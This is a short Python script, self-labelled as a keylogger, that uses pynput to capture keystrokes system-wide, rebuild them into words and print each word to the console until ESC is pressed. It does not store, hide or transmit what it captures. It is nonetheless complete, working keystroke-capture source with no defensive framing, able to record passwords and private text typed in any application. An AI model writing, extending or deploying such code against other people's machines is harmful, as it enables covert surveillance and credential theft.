from pynput import keyboard

current_word = []

def on_press(key):
    global current_word
    try:
        
        char = key.char
        if char is not None:
            current_word.append(char)  
    except AttributeError:
        
        if key == keyboard.Key.space or key == keyboard.Key.enter:
            word = ''.join(current_word)  
            if word:
                print(f"Word captured: {word}")  
                current_word = []  
        elif key == keyboard.Key.backspace:
            if current_word:
                current_word.pop()  


def on_release(key):
    if key == keyboard.Key.esc:
        return False  


print("Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  

print("Keylogger stopped.")